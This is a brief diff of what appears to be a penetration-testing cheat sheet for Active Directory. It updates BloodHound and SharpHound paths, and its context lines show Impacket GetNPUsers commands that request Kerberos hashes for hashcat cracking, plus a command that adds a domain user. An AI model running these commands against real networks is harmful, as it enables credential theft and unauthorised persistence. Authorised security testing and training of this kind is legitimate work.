@@ -664,9 +664,9 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -userfile {USER.txt} -format hashcat
 
 # Bloodhound
-sudo ./usr/bin/neo4j console # LHOST
-./sharphound.exe -c all      # RHOST
-./BloodHound  --no-sandbox   # LHOST
+sudo ./usr/bin/neo4j console                                     # LHOST
+./opt/bloodhound/resources/app/Collectors/SharpHound.exe -c all  # RHOST
+./opt/bloodhound/BloodHound  --no-sandbox                        # LHOST
 
 # Add user
 net user {USERNAME} {PASSWORD} /add /domain
